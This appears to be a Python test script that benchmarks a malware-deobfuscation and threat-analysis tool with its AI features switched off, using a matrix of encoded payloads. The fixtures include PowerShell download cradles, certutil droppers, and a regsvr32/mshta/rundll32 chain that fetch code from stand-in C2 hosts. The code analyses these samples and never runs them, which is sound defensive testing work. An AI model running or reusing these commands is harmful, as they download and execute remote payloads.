"""AI-OFF capability report — measures NivXRay decoder + investigator when
EMERGENT_LLM_KEY is empty (zero AI calls). Runs a wide payload matrix and
prints a machine-readable summary the analyst can attach to a change ticket.
"""
from __future__ import annotations
import base64
import json
import os
import time

# ── FORCE AI-OFF ─────────────────────────────────────────────────────────
os.environ["EMERGENT_LLM_KEY"] = ""
os.environ["LLM_TIEBREAKER_PROVIDER"] = "claude"  # will be no-op with empty key


from analysis_core import deterministic_best_decode  # noqa: E402
from operations import extract_iocs, mitre_map  # noqa: E402
from lolbas import scan_lolbas  # noqa: E402
from reasoning.moe_panel import run_panel  # noqa: E402


def b64u16(s):
    return base64.b64encode(s.encode("utf-16le")).decode()


PAYLOADS = [
    # (name, expected_chain_contains, payload)
    ("rot13_powershell", ["rot13"], "CbjreFuryy -Abc -j uvqqra -p vrk(vje uggc://p8/z.cf1)"),
    ("b64_utf16le_iex", ["base64-decode"], (
        "powershell -nop -w hidden -enc " + b64u16(
            "IEX (New-Object Net.WebClient).DownloadString('http://c2.example/a.ps1')"
        )
    )),
    ("hex_shellcode", [],  # PE header → shellcode analyzer terminal state
     "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000"),
    ("base58_hello", ["base58-decode"], "2NEpo7TZRRrLZSi2U"),
    ("base32_downloader", ["base32-decode"],
     "NB2HI4DTHIXS653XO4XGY2LOMU======"),
    ("multi_stage_b64_gzip", ["base64-decode"],
     base64.b64encode(
         base64.b64decode("H4sIAAAAAAAAA/PLLylKS8xLqbTiApJmXFwAn3WV9RIAAAA=")
     ).decode()),
    ("certutil_dropper", [],  # plaintext malicious — no decode required
     "certutil.exe -urlcache -f https://c2.evil/payload.txt d.txt && certutil.exe -decode d.txt d.exe"),
    ("lolbas_chain",
     [],
     "powershell -nop -w hidden -c \"IEX(iwr http://x/a.ps1)\" && "
     "certutil -urlcache -f http://c2/x.txt x.txt && "
     "certutil -decode x.txt x.exe && rundll32 x.dll,Entry && "
     "regsvr32 /s /i:http://c2/y.sct scrobj.dll && mshta http://c2/z.hta"),
    ("double_base64_downloader", ["base64-decode"],
     base64.b64encode(base64.b64encode(
         b'IEX (iwr "http://c2/next.ps1" -UseBasicParsing).Content'
     )).decode()),
    ("triple_encoded_ascii_decimal", ["ascii-decimal-decode"],
     "112 111 119 101 114 115 104 101 108 108 32 45 110 111 112 32 45 101 110 99"),
]


def run_one(name, payload, expected):
    t0 = time.time()
    det = deterministic_best_decode(payload, analysis_mode="balanced")
    dt_dec = int((time.time() - t0) * 1000)
    chain = [s.get("op") for s in det.get("steps", []) if s.get("op")]
    decoded = det.get("output") or ""
    corpus = decoded + "\n" + payload
    iocs = extract_iocs(corpus)
    mitre = mitre_map(corpus)
    lolbins = scan_lolbas(corpus)

    # Feed evidence into the MoE panel (AI-OFF → deterministic fallback)
    t1 = time.time()
    ev = {
        "input": payload, "decoded_output": decoded,
        "steps": det.get("steps") or [],
        "iocs": iocs, "mitre": mitre, "lolbins": lolbins,
        "verdict": {"engine": det.get("engine")},
    }
    panel = run_panel(ev, session_id=f"aioff-{name}")
    dt_moe = int((time.time() - t1) * 1000)

    total_findings = sum(len(r["findings"]) for r in panel["reviewers"].values())
    consensus = len(panel["synthesis"]["consensus"])
    verdict = panel["synthesis"]["verdict"]

    expected_ok = all(op in chain for op in expected)

    return {
        "name": name,
        "decode_ms": dt_dec,
        "moe_ms": dt_moe,
        "chain": chain,
        "expected_ops": expected,
        "chain_ok": expected_ok,
        "decoded_len": len(decoded),
        "n_iocs": sum(len(v) if isinstance(v, list) else 0 for v in iocs.values()),
        "n_mitre": len(mitre),
        "n_lolbins": len(lolbins),
        "moe_findings": total_findings,
        "moe_consensus": consensus,
        "verdict_label": verdict["label"],
        "verdict_conf": verdict["confidence"],
        "moe_provider": panel["provider"],
    }


def main():
    print(f"AI-OFF Capability Report · EMERGENT_LLM_KEY={'set' if os.environ.get('EMERGENT_LLM_KEY') else 'EMPTY'}\n")
    results = []
    for name, exp, p in PAYLOADS:
        try:
            r = run_one(name, p, exp)
        except Exception as e:
            r = {"name": name, "error": str(e)[:200]}
        results.append(r)

    # Print table
    hdr = f"{'PAYLOAD':<28} {'DEC_MS':>6} {'MOE_MS':>7} {'CHAIN':<45} {'IOC':>4} {'MIT':>4} {'LOL':>4} {'FIND':>4} {'CON':>4} {'VERDICT':<18}"
    print(hdr)
    print("-" * len(hdr))
    for r in results:
        if "error" in r:
            print(f"{r['name']:<28} ERROR · {r['error']}")
            continue
        chain_s = "→".join(r["chain"][:5]) or "-"
        verdict_s = f"{r['verdict_label']}({r['verdict_conf']:.2f})"
        marker = "✓" if r["chain_ok"] else "✗"
        print(f"{marker} {r['name']:<26} {r['decode_ms']:>6} {r['moe_ms']:>7} {chain_s[:45]:<45} "
               f"{r['n_iocs']:>4} {r['n_mitre']:>4} {r['n_lolbins']:>4} "
               f"{r['moe_findings']:>4} {r['moe_consensus']:>4} {verdict_s:<18}")

    ok = sum(1 for r in results if r.get("chain_ok"))
    print(f"\nChain accuracy (deterministic, AI-OFF): {ok}/{len(results)}")

    # Aggregate
    total_decode = sum(r["decode_ms"] for r in results if "decode_ms" in r)
    total_moe = sum(r["moe_ms"] for r in results if "moe_ms" in r)
    total_findings = sum(r.get("moe_findings", 0) for r in results)
    total_iocs = sum(r.get("n_iocs", 0) for r in results)
    total_mitre = sum(r.get("n_mitre", 0) for r in results)
    total_lolbins = sum(r.get("n_lolbins", 0) for r in results)
    print(f"\nTOTAL DECODE TIME: {total_decode} ms · TOTAL MOE PANEL TIME: {total_moe} ms")
    print(f"ARTEFACTS: {total_iocs} IOC(s), {total_mitre} MITRE, {total_lolbins} LOLBin(s), {total_findings} findings")

    out_path = "/tmp/ai_off_capability_report.json"
    with open(out_path, "w") as f:
        json.dump({"payloads": results, "summary": {
            "chain_accuracy": f"{ok}/{len(results)}",
            "total_decode_ms": total_decode,
            "total_moe_ms": total_moe,
            "artefacts": {"iocs": total_iocs, "mitre": total_mitre,
                            "lolbins": total_lolbins, "findings": total_findings},
        }}, f, indent=2)
    print(f"\nJSON report saved to {out_path}")


if __name__ == "__main__":
    main()
